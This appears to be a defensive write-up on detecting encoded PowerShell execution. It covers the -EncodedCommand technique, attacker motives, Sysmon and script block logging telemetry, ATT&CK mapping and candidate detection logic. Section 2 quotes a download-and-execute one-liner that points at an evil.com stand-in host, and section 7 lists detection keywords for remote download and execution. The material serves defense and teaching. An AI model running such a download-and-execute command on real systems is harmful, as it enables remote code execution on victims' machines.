# PowerShell EncodedCommand Validation

**Mission Question:** Can we detect encoded PowerShell execution, or are we assuming?

## Table of Contents

1. [How Does the Technique Work?](#1-how-does-the-technique-work)  
2. [Why Do Attackers Use It?](#2-why-do-attackers-use-it)  
3. [What Telemetry Is Generated?](#3-what-telemetry-is-generated)  
4. [What Assumptions Do Defenders Make?](#4-what-assumptions-do-defenders-make)  
5. [ATT\&CK Mapping](#5-attck-mapping)  
6. [Telemetry Inventory](#6-telemetry-inventory)  
7. [Detection Opportunities](#7-detection-opportunities)  
8. [Validation Questions](#8-validation-questions)  
9. [Weekly Deliverable Summary](#9-weekly-deliverable-summary)

## 1\. How Does the Technique Work?

### Core Execution Flow

PowerShell's `-EncodedCommand` flag (aliases: `-enc`, `-en`, `-e`) accepts a Base64-encoded string and executes it as a command. This is a legitimate built-in feature designed for passing complex commands across process boundaries.

**Basic encoding example:**

\# Original command

$command \= 'Write-Host "Hello, Attacker."'

\# Encode it (must be UTF-16LE for PowerShell)

$bytes \= \[System.Text.Encoding\]::Unicode.GetBytes($command)

$encoded \= \[Convert\]::ToBase64String($bytes)

\# Execute via \-EncodedCommand

powershell.exe \-EncodedCommand $encoded

**Full execution flow:**

Attacker prepares payload

        ↓

Encodes payload as Base64 (UTF-16LE)

        ↓

Passes encoded string via \-EncodedCommand flag

        ↓

PowerShell.exe spawns

        ↓

Runtime decodes Base64 in memory

        ↓

Decoded commands execute within PowerShell context

        ↓

No script file written to disk

### Required Prerequisites

- PowerShell must be available (present on all modern Windows systems)  
- No special privileges required for execution itself  
- Payload must be valid UTF-16LE Base64 or the runtime will throw an error

### Common Variations

| Variant | Example |
| :---- | :---- |
| Full flag | `powershell.exe -EncodedCommand <b64>` |
| Short alias `-enc` | `powershell.exe -enc <b64>` |
| Truncated `-e` | `powershell.exe -e <b64>` |
| With `-NoProfile -WindowStyle Hidden` | Common combo to reduce visibility |
| Double-encoded | Base64 inside Base64 — less common, more evasive |
| Concatenated encoding | Splitting encoded string across multiple variables |

### Parent-Child Process Relationships

Common parent processes that spawn encoded PowerShell:

- `cmd.exe` → `powershell.exe -enc ...`  
- `winword.exe` / `excel.exe` → `powershell.exe -enc ...` (macro delivery)  
- `wscript.exe` / `cscript.exe` → `powershell.exe -enc ...` (script-based dropper)  
- `mshta.exe` → `powershell.exe -enc ...` (HTA delivery)

## 2\. Why Do Attackers Use It?

### Obfuscation Benefits

Base64 encoding obscures the plaintext intent of a command. A simple `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')` becomes an unreadable string to the untrained eye and basic string-matching rules.

### Payload Concealment

- Encoded strings do not show up in simple grep-based log searches for keywords like `DownloadString`, `Invoke-Expression`, or `IEX`  
- Makes human triage harder — analysts must decode and inspect  
- Evades basic SIEM rules that hunt for known-bad strings in plaintext

### Evasion Opportunities

| Evasion Goal | How EncodedCommand Helps |
| :---- | :---- |
| Bypass script-based AV signatures | Plaintext payload not written to disk or visible in command line initially |
| Evade simple regex detection | Base64 doesn't pattern-match against known-bad string rules |
| Complicate forensic review | Encoded commands in logs require manual decode steps |
| Blend with legitimate tooling | `-EncodedCommand` is a built-in, non-suspicious flag on its own |

### Reliability

- Works across all modern Windows versions with PowerShell installed  
- Does not require admin rights  
- Consistent behavior regardless of PowerShell version (v2–v7)

### Popularity Among Threat Actors

Used extensively by:

- **APT groups**: Encoded commands are a staple of nation-state TTPs documented in the MITRE ATT\&CK database  
- **Commodity malware**: Emotet, TrickBot, and many RATs use `-EncodedCommand` for staged delivery  
- **Red team toolkits**: Cobalt Strike, Metasploit, and PowerShell Empire all leverage encoding  
- **Living-off-the-land (LOTL)** campaigns: preferred because it uses a native Windows tool

## 3\. What Telemetry Is Generated?

### Sysmon Event ID 1 — Process Creation

The most reliable initial signal. Captures:

- Full command line including the encoded string  
- Parent process name and PID  
- Image hash  
- User context

**What to look for:**

EventID: 1

Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe

CommandLine: powershell.exe \-enc JABj...

ParentImage: C:\\Windows\\System32\\cmd.exe

⚠️ **Gap:** If Sysmon is not deployed or command-line logging is disabled in Group Policy, this event is not generated.

### PowerShell Operational Log (Event ID 4103, 4104\)

- **4103**: Module logging — captures pipeline execution results  
- **4104**: Script block logging — captures the **decoded** script content before execution

**This is the gold standard.** When script block logging is enabled, the decoded payload appears in the event, defeating the obfuscation.

⚠️ **Gap:** Script block logging must be explicitly enabled. It is **not on by default** in many environments.

### AMSI (Antimalware Scan Interface)

AMSI intercepts PowerShell content and passes it to registered security products before execution.

- Scans decoded content, not the Base64 blob  
- Visibility depends on the AV/EDR vendor's AMSI integration  
- Can be bypassed (see Week 5\)

### Windows Defender / EDR Telemetry

- Process creation with suspicious flags  
- Memory scanning events  
- Behavioral rules based on encoded command patterns

### Event ID 4688 — Process Creation (Security Log)

Native Windows security event. Requires **audit process creation** and **include command line in process creation events** to be enabled via Group Policy.

⚠️ **Gap:** Command-line logging in 4688 is disabled by default in most configurations.

### Network Telemetry

If the encoded payload retrieves additional content (common pattern), you may see:

- DNS queries to attacker infrastructure  
- HTTP/HTTPS connections from `powershell.exe`  
- Proxy logs capturing suspicious User-Agents

## 4\. What Assumptions Do Defenders Make?

These are the assumptions that the DetectionHunter methodology exists to challenge:

| Assumption | Reality |
| :---- | :---- |
| "Encoded commands are always visible in logs" | Only if Sysmon or 4688 with command-line logging is deployed and operational |
| "Base64 detection is sufficient coverage" | Detection of encoding ≠ detection of the payload intent; can be bypassed with double encoding or concatenation |
| "PowerShell logging is enabled" | Script block logging is OFF by default; many orgs never enable it |
| "AMSI covers us" | AMSI can be bypassed; see Week 5 |
| "Our SIEM alerts on \-EncodedCommand" | If the rule fires but no one investigates, coverage is an illusion |
| "Alerts equal coverage" | An alert that doesn't generate a ticket, investigation, or response is not coverage |
| "We'd catch this in endpoint detection" | EDR visibility depends on policy configuration and exclusions |

## 5\. ATT\&CK Mapping

| Field | Value |
| :---- | :---- |
| **Tactic** | Defense Evasion, Execution |
| **Technique** | T1059.001 — Command and Scripting Interpreter: PowerShell |
| **Sub-technique** | Obfuscated Files or Information (T1027) |
| **Platform** | Windows |
| **Data Sources** | Process: Process Creation, Script: Script Execution, Command: Command Execution |

## 6\. Telemetry Inventory

| Data Source | Event ID | Coverage | Default Enabled? |
| :---- | :---- | :---- | :---- |
| Sysmon Process Creation | Event ID 1 | High — full command line | No (requires Sysmon deploy) |
| PowerShell Script Block Logging | Event ID 4104 | Very High — decoded content | No — must be GPO-enabled |
| PowerShell Module Logging | Event ID 4103 | Medium | No — must be GPO-enabled |
| Windows Security Log | Event ID 4688 | Medium — requires cmd-line config | Partial — often incomplete |
| AMSI | Vendor-dependent | Medium | Yes — if AV/EDR integrated |
| Network/Proxy Logs | N/A | Low for this technique alone | Varies |
| EDR Behavioral Telemetry | Vendor-dependent | High | Depends on EDR policy |

## 7\. Detection Opportunities

### High Confidence

\+ powershell.exe spawned with \-EncodedCommand|-enc|-e flag

\+ Base64 string length \> 100 characters

\+ Parent process is Office application, mshta.exe, wscript.exe, or cmd.exe

### Medium Confidence

\+ powershell.exe spawned with \-WindowStyle Hidden \-NonInteractive \-NoProfile

\+ Any encoded command flag present

### Script Block Logging (If Enabled)

Event ID 4104

\+ Contains: DownloadString | IEX | Invoke-Expression | Net.WebClient | WebRequest

### Baseline Deviation

Frequency of \-EncodedCommand execution per host per day

\> 2 standard deviations from 30-day baseline

**Note:** Detection logic candidates here are investigative hypotheses, not production rules. Each must be validated before deployment.

## 8\. Validation Questions

Before closing, answer these honestly:

- [ ] **Is Sysmon deployed** on endpoints in scope? If yes, is Event ID 1 forwarding to your SIEM?  
- [ ] **Is script block logging enabled** via GPO? Can you verify in a test environment that 4104 events fire?  
- [ ] **Can you decode a sample** Base64 encoded command from your logs right now?  
- [ ] **Does your SIEM have a rule** for `-EncodedCommand`? Has it ever fired? Has that alert ever been investigated?  
- [ ] **Can you prove** your AMSI integration is active and not bypassed?  
- [ ] **Run a test**: Execute `powershell.exe -enc <benign_encoded_command>` in a lab — what telemetry did you actually collect?

